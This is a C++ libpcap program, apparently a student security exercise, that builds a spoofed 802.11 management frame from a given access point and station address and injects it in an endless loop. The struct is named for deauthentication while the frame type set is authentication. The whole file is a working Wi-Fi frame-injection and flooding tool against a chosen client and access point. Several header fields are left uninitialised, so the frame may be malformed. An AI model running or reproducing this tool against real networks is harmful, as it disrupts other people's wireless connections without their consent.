#include <iostream>
#include <pcap.h>
#include <string.h>  // for memcpy
#include <unistd.h>  // for sleep
#include <mac.h>

using namespace std;

char * ST_MAC;

#pragma pack(push, 1)
struct Radiotap_header {
    uint8_t   version;     /* set to 0 */
    uint8_t   pad;
    uint16_t  len;         /* entire length */
    uint32_t  present;     /* fields present */
};
#pragma pack(pop)

#pragma pack(push, 1)
struct Deauth_Frame {
    uint16_t  type;
    uint16_t  dur;
    Mac   dst_mac;
    Mac   src_mac;
    Mac   bssid;
    uint16_t  number;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct Fixed_parameters {
    uint16_t auth_al;
    uint16_t auth_SEQ;
    uint16_t sta_code;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct Wir_Management {
    Fixed_parameters Fixed_pa;
};
#pragma pack(pop)


struct Deauth_Packet {
    Radiotap_header  radiotab;
    uint8_t nul[3];
    Deauth_Frame     d_frame;
    Wir_Management   w_manage;
};


void usage() {
    cout << "syntax : Authentication <interface> <ap mac> <station mac>\n";
    cout << "sample : Authentication wlan0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
}

int main(int argc , char * argv[]) {

    if (argc != 4) {
        usage();
        return -1;
    }

    cout << "** Authentication Start **\n";

    char * Interface = argv[1];
    char * AP_MAC = argv[2];
    char * ST_MAC = argv[3];

    int j=0;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        cout << "pcap handle error! \n";
        return -1;
    }

    Deauth_Packet packet;

    packet.radiotab.len = 0x000b;
    packet.d_frame.type = 0x00b0;
    packet.d_frame.dur = 0x013a;
    packet.d_frame.dst_mac = Mac(ST_MAC);
    packet.d_frame.src_mac = Mac(AP_MAC);
    packet.d_frame.bssid = Mac(AP_MAC);
    packet.w_manage.Fixed_pa.auth_SEQ = 0x0020;


    while(1) {
        int res = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&packet),sizeof(Deauth_Packet));
        cout << "Packet  " << j << endl;
        j++;
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            break;
        }
        usleep(100000);
    }

    pcap_close(handle);
    cout << "Success!!\n";
}
